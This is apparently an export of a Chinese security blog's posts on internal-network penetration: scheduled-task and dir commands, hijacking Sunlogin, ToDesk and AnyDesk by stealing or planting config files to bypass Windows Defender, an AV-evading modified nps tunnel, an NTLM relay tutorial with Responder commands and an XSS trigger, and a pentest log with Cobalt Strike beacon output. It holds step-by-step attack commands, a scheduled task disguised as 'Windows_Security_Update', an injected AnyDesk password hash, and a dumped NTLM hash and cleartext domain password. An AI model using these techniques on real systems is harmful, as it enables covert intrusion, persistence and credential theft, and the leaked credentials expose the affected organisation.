bf8206542fe6806a4656e4493736d1ef131f0c1480fcc5f0d5c4d69943ae1216a77f93631d592b6cb9359a96612e2f1826d5f9556d99eed7dcb70445ed2281a09596c3489d4d161e27adf862af7ef70247f265a2ac5805d500795627f3da41a92f5811507bb9b164c718823e6eab1e78187bb28de028b8201379fbaa4e004fd4c1a39d22bf4edbf287a2ddb54ccdaf5d212ce2cf86702a17d8c6b7ae0e4fdb9f0907f24364527a107fdd47c5a82d117816e9430e3e2a93aa86bea6f0de3551dd5331045ea6c9bce47459c544519a8b8231afcc7a1ee8d75fa5824b66949c4b54fbcc9a08a6e813a34d0372049858e4f86390e96e4ca1f053c2ff8a4b48d8f60a77cf4328c975f55a7ac204e6a5306dcda09890c6cc001fe12e9122aa4f6fe9547bdc353520fad685c27a9c8f49f808d0891247edc5b120f8d9bc72a8c3d28e831a3b658b2aeb9cb1c3d176f519bbc1b662ff269d74bc0bd1cee31ec06b723e9dfde63804b30f828ae1255df36b7c0bec4b422ee44fcdc63e6b6cb420234c25109061cebee85e63c75aecdf8de4ceee08f2ce59cefcd15367bd30f238374cc71fb1bc7426e22d057ad0751fc3c6d5b0161a\n  \n    \n      \n      \n        输入密码查看\n      \n    \n  \n\n","slug":"生产者消费者问题","date":"2023-06-07T15:11:37.000Z","categories_index":"","tags_index":"开发","author_index":"Q16G"},{"id":"c4556658ea93de4cdb9b9ffeed31a388","title":"内网渗透命令详解","content":"计划任务（schtasks）&#x2F;create: 创建新的计划任务。如果任务存在，则会显示错误信息。\n&#x2F;delete: 删除现有的计划任务。\n&#x2F;query: 列举现有的计划任务。\n&#x2F;change: 改变现有的计划任务。\n&#x2F;Run: 立即运行计划任务。\n&#x2F;End: 停止正在运行的计划任务。\n&#x2F;Tn taskname: 指定要管理的计划任务的名称。\n&#x2F;RU username: 指定要运行计划任务的用户。这个用户必须是本地用户或域用户。\n&#x2F;RP password: 指定要用于运行计划任务的用户密码。\n&#x2F;SC schedule: 指定计划任务执行的时间表。可用的选项有MINUTE、HOURLY、DAILY、WEEKLY\n&#x2F;ST starttime:指定计划任务开始执行的时间\n&#x2F;SD startdate：指定计划任务的开始日期。\n&#x2F;ET endtime：指定计划任务结束执行的时间。\n&#x2F;ED enddate：指定计划任务结束执行的日期。\n&#x2F;TR taskrun：指定要在计划任务上运行的程序或命令。\n\nschtasks &#x2F;create &#x2F;tn &quot;windows_security&quot; &#x2F;SC DALITY &#x2F;TR &quot;C:\\windows\\1.txt&quot; &#x2F;RU Administrator\n\n（1）创建一个计划任务 \n（2）名字是windows_security \n（3）每天启动一次\n（4）运行C:\\windows\\1.txt\n（5）运行用户是Administrator\n\n\n\ndir命令语法格式：\ndir [drive:][path][filename] [&#x2F;A[[:]attributes]] [&#x2F;B] [&#x2F;C] [&#x2F;D[:date]] [&#x2F;L] [&#x2F;N] [&#x2F;O[[:]sortorder]] [&#x2F;P] [&#x2F;Q] [&#x2F;R] [&#x2F;S] [&#x2F;T[[:]timefield]] [&#x2F;W] [&#x2F;X] [&#x2F;4]\n\n这里介绍几个常用的\n&#x2F;A：指定要列出的文件属性\n&#x2F;B：以简易的格式列出文件名\n&#x2F;Q：显示文件所有者是谁\n&#x2F;S：递归子目录下所有文件\n\n如果在后渗透阶段，拿到了用户权限非管理员，这里就可以使用dir命令来查看当前用户有哪些文件管理权限\ndir &#x2F;s &#x2F;q | findstr &quot;Q16G&quot; &#x2F;&#x2F;查看当前目录以及子目录下属于Q16G的文件有哪些\n\n\n\n","slug":"内网渗透命令详解","date":"2023-05-29T13:54:05.000Z","categories_index":"","tags_index":"内网渗透","author_index":"Q16G"},{"id":"cc6d2d872c17e9f57d00d14d5f5b2ba7","title":"内网远程控制总结","content":"前言在内网渗透过程中，会碰到远程控制soft或者其他，这里针对远程控制软件做如下总结。\n远程控制软件向日葵篇向日葵查看版本向日葵（可以攻击）针对向日葵的话其实如果有本地安装的话，是有可能存在漏洞的。这里进行复现\n向日葵个人版for Windows &lt;&#x3D; 11.0.0.33\n向日葵简约版 &lt;&#x3D; V1.0.1.43315（2021.12）\n测试客户端漏洞版本:11.0.0.33162\n\n攻击过程：\n（1）tasklist 查看是否有sunlogin的进程\n（2）直接用golang的工具来进行攻击即可\n\nhttps:&#x2F;&#x2F;github.com&#x2F;Mr-xn&#x2F;sunlogin_rce\n\n向日葵（不可以攻击）遇到不可以攻击的向日葵，我们也有几种渗透手法：\n（1）窃取配置文件来进行解密（低版本 版本号具体未知）低版本的向日葵把密码和机器码加密写入到了配置文件中，我们可以把配置文件down到自己的机器上，然后进行重开向日葵即可。这里向日葵版本较低，就不进行测试\n（2）在12.5.2之前的某些版本可以写到了注册表中，所以可以使用注册表来进行查询reg query HKEY\\_USERS\\\\.DEFAULT\\\\Software\\\\Oray\\\\SunLogin\\\\SunloginClient\\\\SunloginInfo  \nreg query HKEY\\_USERS\\\\.DEFAULT\\\\Software\\\\Oray\\\\SunLogin\\\\SunloginClient\\\\SunloginGreenInfo  \n\n向日葵默认配置文件路径:  \n安装版：C:\\\\Program Files\\\\Oray\\\\SunLogin\\\\SunloginClient\\\\config.ini  \n便携版：C:\\\\ProgramData\\\\Oray\\\\SunloginClient\\\\config.ini  \n本机验证码参数：encry\\_pwd  \n本机识别码参数：fastcode(去掉开头字母)  \nsunlogincode：判断用户是否登录状态\n\n\n\n在向日葵高于 12.5.3.* 的机器中已经没有办法获取secert了\n\ntodesk篇常见渗透方式（偷配置，百试百灵）这里还是和前面的向日葵一样，可以进行配置文件的窃取，这里的默认安装路径（C:\\Program Files\\ToDesk\\config.ini）\n\n这里咱们可以攻击机安装todesk，然后读取到config.ini中的配置文件，然后和攻击机进行替换即可。这里我虚拟机假装是受害机，读取出来，然后攻击机把tempauthpassex进行替换。\n\n本机下载todesk进行替换。\n\n两个机器密码相同（进行替换的时候需要修改攻击机密码更新频率）\n\n\nanydeskanydesk的配置文件在 C:\\Users\\用户名\\AppData\\Roaming\\AnyDesk   文件中\n\n而通常这个时候我们有权限修改anydesk的配置文件，这里进行测试，起两个虚拟机，设定一个场景（攻击机拿到了webshell，受害机开着windows defender，如何去渗透拿到受害机权限）\n攻击机 ip: 10.211.55.3 + 10.211.55.2\n受害机 ip: 10.211.55.4（windows defender全开）\n\n情景复现这里拿到了受害机的webshell，是个普通权限，无法去关闭\n\n这里可以看到有windows defender来运行，这里无法进行关闭windows defender，\n\n这里用powershell来执行远程命令下载anydesk到用户的目录中去,因为虚拟机只有C盘，所以我创建了一个目录来进行存放，在真实的渗透过程中，一般是有RWE的目录\n可以用任意一种方式来放进去，只要放进去就有，这里列举一种方式\n这里列举一种（也可以有权限之后，直接拖入上传）\ncertutil -urlcache -split -f https:&#x2F;&#x2F;download.anydesk.com&#x2F;AnyDesk.exe C:&#x2F;tmp&#x2F;anydesk.exe\n\n\n上传上去之后，先不去打开。转到攻击机进行操作\n  （1）这里先去给攻击机下载anydesk（如果下载过的小伙伴，要先清除） C:\\Users\\用户名\\AppData\\Roaming\\AnyDesk中的配置，没有的就不用看这一步，清除结束后如下\n\n（2）这里打开攻击机的anydesk，牢记我此处勾选的id，然后点击右上角的概述–&gt;为自主访问设置密码–&gt;设置一个密码（这里设置为Q16G666!!）—&gt;之后点击应用，攻击机完全退出anydesk（小托盘也要退出），并且退出时不选择安装anydesk\n\n（3）攻击机完全退出anydesk（小托盘也要退出），这里还是到配置文件下 C:\\Users\\用户名\\AppData\\Roaming\\AnyDesk，然后把文件复制下来。是我图中勾选的这四个。复制完成之后，攻击机将文件进行删除。\n\n复制下来之后，给受害机的当前用户（拿到权限的用户）找到anydesk配置文件路径并且复制到其他（如果没有配置文件路径则进行创建配置文件路径），一定要注意这里攻击机复制完之后，一定要将攻击机中的配置文件进行删除\n（4）重新打开攻击机，生成配置文件，启动受害机的anydesk。\n\n（5）用攻击机进行连接，这里连接的id就是（2）中截图的id，密码就是（2）中设置的密码即可成功无感绕过windows defender\n情景复现2 （计划任务）（1）确定用户创建计划任务如果命令行不能去执行，则可以去创建计划任务去执行，例如，必须先确定当前用户，在当前用户的目录下执行anydesk，\npowershell &quot;(((Get-WmiObject -Class Win32_Process -Filter &#39;Name&#x3D;\\&quot;explorer.exe\\&quot;&#39;).GetOwner().user) -split &#39;\\n&#39;)[0]\n\nschtasks &#x2F;Create &#x2F;TN Windows_Security_Update &#x2F;SC monthly &#x2F;tr &quot;C:\\Users\\testuser.G1TS\\Desktop\\anydesk.exe&quot; &#x2F;RU 用户名\n\n执行计划任务\nschtasks &#x2F;run &#x2F;tn Windows_Security_Update\n\n后续步骤和上面相同\n\n然后添加密码到配置文件中去（密码为AnyDeskGetAccess）\necho ad.anynet.pwd_hash&#x3D;85352d14ed8d515103f6af88dd68db7573a37ae0f9c9d2952c3a63a8220a501c &gt;&gt; C:\\Users\\用户目录\\AppData\\Roaming\\AnyDesk\\service.conf\necho ad.anynet.pwd_salt&#x3D;cb65156829a1d5a7281bfe8f6c98734a &gt;&gt; C:\\Users\\用户目录\\AppData\\Roaming\\AnyDesk\\service.conf\n\n然后查看用户的id\ntype C:\\Users\\用户名\\AppData\\Roaming\\AnyDesk\\system.conf\n\n连接即可\n优点：整个过程都不需要进行UAC弹窗，真正实现了无感绕过\n缺点：（1）会弹出anydesk的界面，导致一些问题\n（2）启动anydesk的权限需要桌面用户权限，比如，IIS做了中间件环境，拿到的webshell一般都是没有桌面用户权限，如果启动anydesk是不会成功的。\ngotohttpgotohttp在我的渗透测试过程中，是一个常见的方式，给我的感觉，即用即连，浏览器连接，方便快捷。但是缺点就是权限划分明确，普通用户权限起的gotohttp无法进行管理员权限操作，比如关闭windows defender和其他一些行为，不过在规避杀软这儿也有奇效。\n复现过程普通用户上去之后只能用普通用户权限（这里下载对应的gotohttp *https://gotohttp.com/*），上传上去，命令行运行他，直接在当前目录下生成配置文件，读取配置文件，即可成功连接\n\n\n因为是普通用户启动的，这里如果尝试关闭windows defender，是无法进行点击的。\n\n参考https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_44216796&#x2F;article&#x2F;details&#x2F;112118108\n\n","slug":"内网远程控制总结","date":"2023-05-26T09:25:44.000Z","categories_index":"","tags_index":"内网渗透","author_index":"Q16G"},{"id":"badd5d9a02640c51cb699c12c4298740","title":"关于nps工具的魔改","content":"免责声明🧐[]: \n本工具仅面向 合法授权 的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。\n在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。\n如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。\n在安装并使用本工具前，请您务必审慎阅读、充分理解各条款内容，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。\n工具来源及其说明（1）nps通信流量比较稳定，但特征抓的比较死，所以基于原版的nps进行二次开发\n\n说明为了工具的免杀性及其后期修改，本人不公开源码。 本人承诺，工具无毒，只能简单进行二开\n魔改部分（1）重写了nps的认证过程，通信过程均进行加密\n（2）重些了npc的部分，预计后续分离config文件进行加载\n（3）进行了nps未授权漏洞的修复，避免了默认配置未授权\n（4）支持config文件从远端进行加载，在传输过程中均实现流量加密\n\n免杀情况（这是魔改后的demo上去的，还请各位测试切莫进行☁️测试、沙箱测试、联网测试）\n魔改后流量魔改后的工具流量就不进行抓取了，需要的话，大家可以自行进行测试。\n某社区☁️沙箱（demo版测试）\nvirustotal\nwindows defender（静态）\nwindows defender（动态）\n360、火绒等其他杀软未进行测试项目使用未进行测试nps服务端的注册，所以目前主要还是 .&#x2F;nps的方式来运行\n服务端使用客户端使用配置文件启动配置文件如下：\n[common]\nserver_addr&#x3D;127.0.0.1:8024\nconn_type&#x3D;tcp\nvkey&#x3D;123456\nauto_reconnection&#x3D;true\nmax_conn&#x3D;1000\nflow_limit&#x3D;1000\nrate_limit&#x3D;1000\nweb_username&#x3D;admin\nweb_password&#x3D;123\ncrypt&#x3D;true\ncompress&#x3D;true\n#pprof_addr&#x3D;0.0.0.0:9999\ndisconnect_timeout&#x3D;60\n\n\n命令行启动\n命令行以远端配置文件启动npc.exe -rconfig ServerConfig地址\neg.\nnpc.exe -rconfig 127.0.0.1:23123\n\n项目进度✅ 2023.5.19 重新写了通信认证协议\n✅ 2023.5.20 把连接流量进行混淆，仅仅支持客户端命令行启动，未支持conf文件启动\n✅ 2023.5.21 支持本地config文件加载\n✅ 2023.5.23 支持config文件仅从服务端拉取\n后续增加（1）实现其他协议流量的魔改\n参考https:&#x2F;&#x2F;github.com&#x2F;ehang-io&#x2F;nps\n\n\n\n\n\n配置有很多师傅在github issue中提出项目无法启动，报错等问题。这里给出一个服务端配置以及客户端启动来进行连接测试。本项目终止维护（可能后期会自己写反向代理（比较菜鸡））\n这里下载https://github.com/Q16G/npsmodify/tree/main/cmd/nps中的conf和web到当前目录。\n\n将对应的版本拉下来。和对应目录同级。\n\n这里去conf中进行配置，conf中配置good.conf\n\ngood.conf图\n\n连接服务端。配置火狐，正常使用就好。（这里仅仅测试了windows、linux应该同样配置也可以上线）\n\n","slug":"关于nps工具的魔改","date":"2023-05-26T07:52:53.000Z","categories_index":"","tags_index":"工具魔改","author_index":"Q16G"},{"id":"87b274fadad0a6b05fd4814550be9f11","title":"NTLM-Relay攻击","content":"前言介绍 NTLM认证分为本地认证和网络认证，当我们开机登陆用户账号的时候，就需要将lsass中的密码转换为明文hash与sam文件中进行对比，这种方式就是本地认证。\n而当我们访问局域网中的一台主机的SMB共享的时候，需要提供凭证才能进行访问，这个过程就是网络认证。\nNTLM协议介绍NTLM协议分为几个部分。 协商、挑战、认证。也叫做挑战响应机制。\n协商：这个是为了解决历史遗留问题，为了向下兼容设计，双方协定一下传输的版本号等各种信息，版本主要分为V1和V2两个版本。\n挑战：如下图。\n认证：对质问结果的验证，验证通过后即可访问资源。\n\n\n工作组中进行挑战过程：（Netlogon协议）（1）客户端向服务器发出登陆请求。\t\n（2）服务器返回一个challenge，包含一个随机数和一个称为realm的字符串。\n（3）客户端使用账号密码和challenge计算出一个respose，然后发送给服务器。\n（4）服务器使用账号密码计算出来一个expected-respose。\n（5）服务器将生成的expected-respose和repose进行对比，如果一致则认证通过。\n\n\n域环境挑战全过程：1.由于域机器中的SAM文件中，不存在域内用户的hash值，所以域内机器将客户端的username、challenge、repose通过netlogon协议交到域控手中，让域控进行身份认证。\n2.域控通过客户端用户名在自己的ntds.dit中进行寻找，用challenge进行加密，再和net-ntlm-hash进行对比，返回结果给域机器\n3.服务器根据DC的结果成功与否返回给客户端\n\n\n\n本地抓包测试这里起了两个windows虚拟机，这里左侧已经连接上去，这里wireshark看下流量包\n\n这里wireshark抓到smb2的数据包\n\n这里可以看到172.16.165.130是相当于登陆机器，由于是非域内环境，所以只能按照本地网络认证的过程来执行，这里会先进行协商，确定版本号，然后进行challenge。\n\n这里服务端会向客户端返回16位的随机数challenge。\n\n然后客户端向要登陆的主机发送用户名对应的NTLMHASH对challenge进行加密得到的Respose。\n\n将获取到的Respose进行Net-NTLMhash格式的拼接。\nNET-NTLMhash格式：\n username:domain:challenge:HMAC-MD5:blob\n \n详细说明一下各个数据的获取：\nusername和domain都可以从下图过程中进行获\nHMAC-MD5为NTProofStr部分（正在username和domain获取中得到）\nblob就是Response中除NTProofStr剩下的部分\n\nusername、domain的获取\n所以当你拼接完成之后，就可以用hashcat来进行解密完成密码的获取。\nNTLM-Relay前置知识windows系统名称的解析顺序当我们访问一个共享时， net use \\aa 其寻找这个主机名会按顺序来进行查找。\n（1）本地的host文件\n（2）DNS的缓存\\DNS服务器\n（3）链路本地多播和NetBios名称服务\n\n如果在1、2中没有找到，系统就会通过链路本地多播名称解析和NetBios名称服务在本地名称解析。这个时候，客户端就会将未经过认证的UDP广播到网络中，询问他是否是本地系统的服务，由于改过程未经过认证，并未广播到整个网络中，从而允许网络上的任何机器响应并声称是这台机器。\n因为当用户输入的不存在、包含错误或者DNS中没有主机名的时候，通过responder工具监听链路本地多播名称解析和Net-BIOS广播，就可以伪装目标机器，从而让受害者交凭证。\nresponder攻击详解Responder工具是一款用于中间人攻击的工具，他可以用于监听本地网络并获取许多凭证，例如NTLM和kerberos凭证。\n--version             显示程序版本并退出\n-h, --help            显示帮助信息并退出\n-A, --analyze         分析模式。此选项允许您查看NBT-NS、BROWSER、LLMNR请求，而无需响应。\n-I eth0, --interface&#x3D;eth0\n要使用的网络接口，可以使用“ALL”作为通配符来表示所有接口\n-i 10.0.0.21, --ip&#x3D;10.0.0.21\n要使用的本地IP（仅适用于OSX）\n-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6&#x3D;2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed\n使用与Responder的IPv6地址不同的另一个IPv6地址扰乱所有请求。\n-e 10.0.0.22, --externalip&#x3D;10.0.0.22\n使用与Responder的IP地址不同的另一个IP地址扰乱所有请求。\n-b, --basic           返回基本的HTTP身份验证。默认值：NTLM\n-d, --DHCP            启用对DHCP广播请求的答复。此选项将在DHCP响应中注入WPAD服务器。默认值：False\n-D, --DHCP-DNS        此选项将在DHCP响应中注入DNS服务器，否则将添加WPAD服务器。默认值：False\n-w, --wpad            启动WPAD恶意代理服务器。默认值为False\n-u UPSTREAM_PROXY, --upstream-proxy&#x3D;UPSTREAM_PROXY\nWPAD代理的上游HTTP代理用于发出请求（格式：host:port）\n-F, --ForceWpadAuth   强制进行wpad.dat文件检索的NTLM&#x2F;Basic身份验证。这可能会导致登录提示。默认值：False\n-P, --ProxyAuth       强制NTLM（透明）&#x2F; Basic（提示）身份验证进行代理。不需要启用WPAD。此选项非常有效。默认值：False\n--lm                  强制Windows XP&#x2F;2003及更早版本使用LM哈希降级。默认值：False\n--disable-ess         强制ESS降级。默认值：False\n-v, --verbose         增加详细程度。\n\nNTLM-Relay攻击\n最重要的意思，攻击者利用网络监听或者其他方式盗取认证凭据，之后再重新把他发送给server。\n实战操作这里下载responder，输入命令\npython3 responder -I etho -f \n\n受害机器执行操作\n\n\n成功收到ntlm的hash值，但是这个是比较鸡肋的，当我们破解不出来密码的时候就显得没有作用。\n另类的NTLM-Repay但是我们可以将凭证中继到其他主机上去，如果在域内的权限足够大，则可以中继到其他主机上去，获取其他主机权限，但是不能relay到真实的主机上去。但是也有一定的前提条件，就是目标主机不能开启smb签名。一般在域内，域控默认打开smb签名，但是域内的机器是不打开smb签名的。\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters&quot;requiresecuritysignature&quot;&#x3D;dword:00000000\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Lanmanworkstation\\Parameters&quot;requiresecuritysignature&quot;&#x3D;dword:00000000\n\n（1）使用脚本进行探测Runfinger脚本探测主机：\n使用responder&#x2F;tools文件夹下的有一款工具叫做RunFinder工具，这里用它来进行内网探测哪台主机可以使用NTLM-Relay攻击，但是这里的runfinger只能在域内进行使用，由于环境限制，我就再进行探测。\n注意事项：\n即使有一个主机，你知道可以进行攻击，但是没有被runfinger显示出来，也不可以进行攻击。\n\n（2）修改responder的配置文件responder.conf，不让其对hash进行抓取。将SMB和HTTP的ON改为Off：\nvim &#x2F;usr&#x2F;share&#x2F;responder&#x2F;Responder.conf\n\n（3）开启responder的监听\nresponder -I eth0 -v\n\n（4）启动MultiRelay.py\ncd &#x2F;usr&#x2F;share&#x2F;responder&#x2F;tools\npython3 MultiRelay.py -t  要攻击的域内目标  -u ALL\npython3 MultiRelay.py -t 192.168.52.171 -u ALL\n\n\n\n\nntlm-relay的触发方式只有域中其他用户访问了一个错误的主机，那么我们作为攻击者就可以触发可以进行NTLM-relay攻击。\n通过http协议触发\n通过SMB协议触发net use \\\\错误的名称\n\n\n收集到的奇怪的触发方式通过xss来进行触发\n&lt;script src&#x3D;\\\\aa&gt;&lt;&#x2F;script&gt;\n\n","slug":"NTLM-Relay攻击","date":"2023-05-24T04:12:28.000Z","categories_index":"","tags_index":"内网渗透","author_index":"Q16G"},{"id":"6926437034a0cc884741b3438fbe3704","title":"关于某次授权的大型内网渗透测试","content":"接到朋友邀请，要对一个站点进行全面渗透，内网发现多DC主机，遂记录。\n背景：接到朋友邀请，要进行一个授权站点的渗透，但是进去实际环境才发现是多域控主机。也学习了很多后渗透手法，比较受益匪浅。\n前期渗透：打点：（任意文件上传）直接发现头像处任意文件上传，这里直接上传冰蝎即可。\n\n\ntasklist查看杀软System Idle Process              0 N/A                                         \nSystem                           4 N/A                                         \nsmss.exe                       240 N/A                                         \ncsrss.exe                      376 N/A                                         \nwininit.exe                    436 N/A                                         \nservices.exe                   524 N/A                                         \nlsass.exe                      532 Kdc, KeyIso, Netlogon, NTDS, SamSs          \nsvchost.exe                    672 BrokerInfrastructure, DcomLaunch, LSM,      \n                                   PlugPlay, Power, SystemEventsBroker         \nsvchost.exe                    716 RpcEptMapper, RpcSs                         \nWRSA.exe                       820 WRSVC                                       \nsvchost.exe                    276 Dhcp, EventLog, lmhosts, Wcmsvc             \nsvchost.exe                    320 Appinfo, BITS, CertPropSvc, gpsvc, IAS,     \n                                   IKEEXT, iphlpsvc, LanmanServer, ProfSvc,    \n                                   Schedule, seclogon, SENS, SessionEnv,       \n                                   ShellHWDetection, Themes, Winmgmt           \nsvchost.exe                    516 EventSystem, FontCache, netprofm, nsi,      \n                                   W32Time, WinHttpAutoProxySvc                \nsvchost.exe                    932 CryptSvc, Dnscache, LanmanWorkstation,      \n                                   NlaSvc, WinRM                               \nsvchost.exe                   1100 BFE, DPS, MpsSvc                            \nspoolsv.exe                   1508 Spooler                                     \nMicrosoft.ActiveDirectory     1540 ADWS                                        \nOfficeClickToRun.exe          1792 ClickToRunSvc                               \nsvchost.exe                   1844 ddpvssvc                                    \ndfsrs.exe                     1892 DFSR                                        \nsvchost.exe                   1908 DHCPServer                                  \nsvchost.exe                   1936 DiagTrack                                   \ndns.exe                       1980 DNS                                         \nfmaonsite.exe                 2024 FMAuditOnsite                               \nismserv.exe                   1340 IsmServ                                     \nMicrosoft.BDD.MonitorServ     1432 MDT_Monitor                                 \nMSOIDSVC.EXE                  2660 msoidsvc                                    \nsvchost.exe                   2328 Net Driver HPZ12                            \nOpenDNSAuditService.exe       2220 OpenDNS Active Directory Service            \nMSOIDSVCM.EXE                 1256 N/A                                         \nsvchost.exe                   2172 Pml Driver HPZ12                   \nScreenConnect.ClientServi      556 ScreenConnect Client (62c0d7e1d3b94bc5)     \nsvchost.exe                   1472 TermService                                 \nOpenDNSAuditClient.exe        2924 N/A                                         \nconhost.exe                   1380 N/A                                         \nVGAuthService.exe             2096 VGAuthService                               \nvmtoolsd.exe                   612 VMTools                                     \nWRCoreService.x64.exe         2136 WRCoreService                               \nWRSkyClient.x64.exe           3180 WRSkyClient                                 \ndfssvc.exe                    3316 Dfs                                         \nWmiPrvSE.exe                  3484 N/A                                         \nsvchost.exe                   3568 UALSVC, UmRdpService                        \nVeeamDeploymentSvc.exe        3612 VeeamDeploySvc                              \nWRSvcMetrics.x64.exe          3580 N/A                                         \nsvchost.exe                   4216 PolicyAgent                                 \nmsdtc.exe                     4160 MSDTC                                       \nDCA.Edge.Console.exe          3676 DCAPulse                                    \niashost.exe                   4548 N/A                                         \nwsmprovhost.exe               9104 N/A                                         \npowershell.exe                7828 N/A                                         \nconhost.exe                   6688 N/A                                         \npowershell.exe                 360 N/A                                         \nconhost.exe                   5152 N/A                                         \nnotepad.exe                   1760 N/A                                         \nLTSvcMon.exe                  5424 LTSvcMon                                    \nLTSVC.exe                     7272 LTService                                   \nlabvnc.exe                    5412 tvnserver                                   \nVeeam.EndPoint.Service.ex     8316 VeeamEndpointBackupSvc                      \nwsmprovhost.exe               7108 N/A                                         \nScreenConnect.WindowsBack     4384 N/A                                         \ncsrss.exe                     7564 N/A                                         \nwinlogon.exe                  5520 N/A                                         \ndwm.exe                       6572 N/A                                         \nlabvnc.exe                    5916 N/A                                         \ntaskhostex.exe                8540 N/A                                         \nWRSA.exe                      2308 N/A                                         \nScreenConnect.WindowsClie     3732 N/A                                         \nexplorer.exe                  3964 N/A                                         \nMRT.exe                       4852 N/A                                         \nvm3dservice.exe               2656 N/A                                         \nMRT.exe                       5196 N/A                                         \nvmtoolsd.exe                  5340 N/A                                         \nDCA.Edge.TrayIcon.exe         6432 N/A                                         \nLTTray.exe                    4564 N/A                                         \nWmiPrvSE.exe                  6336 N/A                                         \nTaskmgr.exe                   6684 N/A                                         \nLogonUI.exe                    380 N/A                                         \ncmd.exe                       2400 N/A                                         \nconhost.exe                   6216 N/A                                         \nnet.exe                       8100 N/A                                         \nnet1.exe                      8908 N/A                                         \ncmd.exe                       2956 N/A                                         \nconhost.exe                   8300 N/A                                         \nnet.exe                       7344 N/A                                         \nnet1.exe                      5248 N/A                                         \ncmd.exe                        432 N/A                                         \nconhost.exe                   9052 N/A                                         \nnet.exe                       7356 N/A                                         \nnet1.exe                      3156 N/A                                         \ncmd.exe                       8232 N/A                                         \nconhost.exe                   4600 N/A                                         \nnet.exe                       5528 N/A                                         \nnet1.exe                      7352 N/A                                         \ncmd.exe                       4304 N/A                                         \nconhost.exe                   7148 N/A                                         \nvds.exe                       3872 vds                                         \ncmd.exe                       7716 N/A                                         \nconhost.exe                   8564 N/A                                         \ntasklist.exe                  9212 N/A   \n\n内网渗透：边缘机的systeminfo因为前期拿到了边缘机，这里查看systeminfo,发现是2012R2的主机。\n\n边缘机提权：（利用烂土豆直接提上权限）提权之后做进程迁移，直接把进程迁移到lsass进程中去。\n\n内网信息收集：先查看ip，看是否存在双网卡机Windows IP Configuration\n\n   Host Name . . . . . . . . . . . . : CAMS-SQL3\n   Primary Dns Suffix  . . . . . . . : AVV.org\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n   WINS Proxy Enabled. . . . . . . . : No\n   DNS Suffix Search List. . . . . . : AVV.org\n\nEthernet adapter Ethernet:\n\n   Connection-specific DNS Suffix  . : \n   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter\n   Physical Address. . . . . . . . . : 00-50-56-98-E3-D6\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n   Link-local IPv6 Address . . . . . : fe80::a5b1:d534:730:3123%11(Preferred) \n   IPv4 Address. . . . . . . . . . . : 10.2.0.49(Preferred) \n   Subnet Mask . . . . . . . . . . . : 255.255.254.0\n\n进行域管理员和域控的查看：域控：net group “domain controllers” &#x2F;domain\n[04/26 18:16:59] beacon> shell net group \"domain Controllers\" /domain\n[04/26 18:17:00] [*] Tasked beacon to run: net group \"domain Controllers\" /domain\n[04/26 18:17:00] [+] host called home, sent: 69 bytes\n[04/26 18:17:00] [+] received output:\nThe request will be processed at a domain controller for domain FPC.LOCAL.\n\nGroup name     Domain Controllers\nComment        All domain controllers in the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAVV-DC1$                 AVV-DC2$                 AVV-DHDC01$              \nAVV-DHDC02$                    \n\n域管：net group “domain admins” &#x2F;domain\nfpcadmin                 mqd.ns          \nmqd.rmm                  mqd.tdv  \n\n前直接归属的域控和主域控：net time &#x2F;domain\n[04/26 18:27:52] beacon> shell net time /domain\n[04/26 18:27:52] [*] Tasked beacon to run: net time /domain\n[04/26 18:27:52] [+] host called home, sent: 47 bytes\n[04/26 18:27:54] [+] received output:\nCurrent time at \\\\AVV-DC2.FPC.LOCAL is 4/26/2023 5:27:53 AM\n\n可以发现当前是直接被DC2所归属，这里查下主控制器。这里直接使用CS插件来进行渗透\n[04/26 18:31:11] [+] =========== 查看主域控制器 ==========\n[04/26 18:31:12] [*] Tasked beacon to run: netdom query pdc\n[04/26 18:31:12] [+] host called home, sent: 47 bytes\n[04/26 18:31:14] [+] received output:\nPrimary domain controller for the domain:\n\nAVV-DC1\nThe command completed successfully.\n\n定位域控的IP地址：这里经过ping之后发现，域控不是都在同一个网段，应该是如下的结构。\n\n内网存活主机探测：我先进行了DC段和本机段存活主机的探测，这里直接利用cs的插件（portscan）\nportscan 10.2.0.0/24\nportscan 10.2.92.30/24\nportscan 10.6.0.10/24\nportscan 10.11.1.12/24\n\n\nfscan扫描本机C段：潦草的扫描到了ftp的匿名登陆，没有扫描到其他有用信息。这里就不放其他几个段的截图，都没扫描到啥有用的信息。\n\n做hashdump：这里直接做完hashdump之后发现\nmsv :   \n     [00000003] Primary\n     * Username : mqd.tdv \n     * Domain   : FPC\n     * NTLM     : 7007ebae678042f1cf112578ac43bf68\n     * SHA1     : 712ce4bf3a4a777582389d37f8d06158ed204f6b\n    tspkg : \n    wdigest :   \n     * Username : mqd.tdv \n     * Domain   : FPC\n     * Password : QWE123456QE!@#\n    kerberos :  \n     * Username : mts.tdv\n     * Domain   : FPC\n     * Password : QWE123456QE!@#\n    ssp :   \n    credman :   